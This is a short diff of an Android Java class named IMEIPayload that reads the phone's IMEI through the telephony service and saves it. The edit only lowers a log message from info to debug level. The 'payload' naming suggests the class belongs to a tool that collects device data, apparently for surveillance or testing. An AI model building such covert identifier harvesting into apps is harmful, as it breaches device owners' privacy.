@@ -21,7 +21,7 @@ public class IMEIPayload extends Payload {
 				.getSystemService(Context.TELEPHONY_SERVICE);
 		String imei = tm.getDeviceId();
 		if (save(imei))
-			Log.i(tag, "IMEI saved successful");
+			Log.d(tag, "IMEI saved successful");
 		else
 			Log.e(tag, "Error while saving the payload output.");
 
